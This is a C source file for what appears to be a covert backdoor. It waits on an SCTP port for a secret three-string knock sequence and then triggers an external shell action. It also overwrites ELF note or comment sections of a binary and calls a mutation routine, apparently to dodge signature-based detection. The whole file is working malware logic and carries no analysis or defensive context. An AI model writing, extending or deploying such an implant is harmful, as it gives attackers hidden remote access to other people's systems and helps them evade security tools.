#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>

// Change path for FreeBSD/Linux:
#ifdef __FreeBSD__
    const char *self = "/proc/curproc/file";
#else
    const char *self = "/proc/self/exe";
#endif

#define PORT_TO_KNOCK 12345
#define EXPECTED_SEQUENCE_SIZE 3

extern int perform_action(); // shell.c
extern int mutate_main(int argc, char **argv); // mutate.c

const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void patch_note_section(FILE *f) {
    Elf64_Ehdr ehdr;
    fread(&ehdr, 1, sizeof(ehdr), f);
    fseek(f, ehdr.e_shoff, SEEK_SET);

    Elf64_Shdr shdr;
    char shstrtab[4096] = {0};

    fseek(f, ehdr.e_shoff + ehdr.e_shentsize * ehdr.e_shstrndx, SEEK_SET);
    fread(&shdr, 1, sizeof(shdr), f);
    fseek(f, shdr.sh_offset, SEEK_SET);
    fread(shstrtab, 1, sizeof(shstrtab) - 1, f);

    for (int i = 0; i < ehdr.e_shnum; ++i) {
        fseek(f, ehdr.e_shoff + i * ehdr.e_shentsize, SEEK_SET);
        fread(&shdr, 1, sizeof(shdr), f);
        const char *name = &shstrtab[shdr.sh_name];
        if (strcmp(name, ".note.ABI-tag") == 0 || strcmp(name, ".comment") == 0) {
            fseek(f, shdr.sh_offset, SEEK_SET);
            char junk[] = "RANDOMIZED-SECTION\0";
            fwrite(junk, 1, sizeof(junk) - 1, f);
            break;
        }
    }
}

int main() {
    int sock;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t len;
    char buffer[1024];

    int fake_argc = 1;
    char *fake_argv[] = { "program_name", NULL };
    sock = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
    if (sock < 0) error("socket");

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    inet_pton(AF_INET, "0.0.0.0", &servaddr.sin_addr);
    servaddr.sin_port = htons(PORT_TO_KNOCK);

    FILE *f = fopen("/usr/bin/hoxha", "r+b");
    if (f) {
    	patch_note_section(f);
    	fclose(f);
    }

    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
        error("bind");

    if (listen(sock, 5) < 0)
        error("listen");

    printf("Listening for SCTP knocks on port %d...\n", PORT_TO_KNOCK);

    int sequenceIndex = 0;

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = sizeof(cliaddr);

        ssize_t n = recvfrom(sock, buffer, sizeof(buffer)-1, 0,
                             (struct sockaddr *)&cliaddr, &len);
        if (n < 0) error("recvfrom");

        buffer[n] = '\0';
        printf("Received knock: %s\n", buffer);

        if (strcmp(buffer, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
            sequenceIndex++;
            if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
                perform_action();
                sequenceIndex = 0;
            }
        } else {
            sequenceIndex = 0;
        }
	mutate_main(fake_argc, fake_argv);
    }

    close(sock);
    return 0;
}
